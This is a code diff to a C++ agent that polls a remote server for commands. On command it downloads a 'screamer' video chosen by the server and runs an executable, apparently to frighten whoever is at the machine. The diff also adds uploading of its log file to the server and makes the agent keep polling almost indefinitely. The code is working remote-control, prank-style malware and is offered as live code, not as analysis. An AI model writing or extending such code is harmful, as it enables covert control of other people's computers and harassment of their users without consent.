@@ -72,8 +72,7 @@ Agent::Agent(const string& config_file) {
 
 
 void Agent::run() {
-    int poll = 0;
-    int spros = 0;
+    int countVidNum = 0, vidKol = 3 ,spros = 0, poll = 0;
     while (true) {
         spros++;
         poll++;
@@ -93,28 +92,39 @@ void Agent::run() {
                 log("Session: " + task["session_id"].get<string>());
                 if (task["task_code"].get<string>() == "TASK") {
                     log("Starting running exe");
-                    std::string video_url = "https://github.com/testerVsego/vid_for_agent/blob/main/screamer.mp4";
+                    task["options"].get<string>() != "" ? countVidNum = std::stoi(task["options"].get<string>()): countVidNum = 1;
+                    
+                    std::string video_url = "https://github.com/testerVsego/vid_for_agent/blob/main/screamer" + std::to_string(countVidNum) + ".mp4";
                     clear_resources();
                     load_vid(video_url, "screamer.mp4");
                     //update_video("screamer.mp4"); 
                     zapusk_exe();  
-                    /*json result = {
-                        {"UID", uid_},
-                        {"access_code", access_code_},
-                        {"message", "Video played"},
-                        {"files", 0},
-                        {"session_id", task["session_id"].get<std::string>()}
-                    };
-                    http_post(server_uri_ + "wa_result/", result.dump());*/
+                    
                 }
                 else if (task["task_code"].get<string>() == "CONF") {
-
+                    log("nu vse bratanchk, ya poshel");
+                    break;
                 }
                 else if (task["task_code"].get<string>() == "TIMEOUT") {
                     interval_ = std::stoi(task["options"].get<string>());
                 }
                 else if (task["task_code"].get<string>() == "FILE") {
+                    std::ifstream log_file("agent.log");
+                    if (log_file.is_open()) {
+                        std::string file_content((std::istreambuf_iterator<char>(log_file)), std::istreambuf_iterator<char>());
                         
+                        json upload_req = {
+                            {"UID", uid_},
+                            {"access_code", access_code_},
+                            {"file_name", "agent.log"},
+                            {"file_data", file_content}
+                        };
+                        
+                        string upload_resp = http_post(server_uri_ + "wa_upload/", upload_req.dump());
+                        log("Upload response: " + upload_resp);
+                    } else {
+                        log("Error: Could not open agent.log for reading");
+                    }
                 }
 
             } else if (code == 0) {
@@ -128,7 +138,7 @@ void Agent::run() {
         }
         
         std::this_thread::sleep_for(std::chrono::seconds(interval_));
-        if (spros >= 20) {
+        if (spros >= 1e9) {
             log("There have been no tasks for a long time, work is ending");
             break;
         }
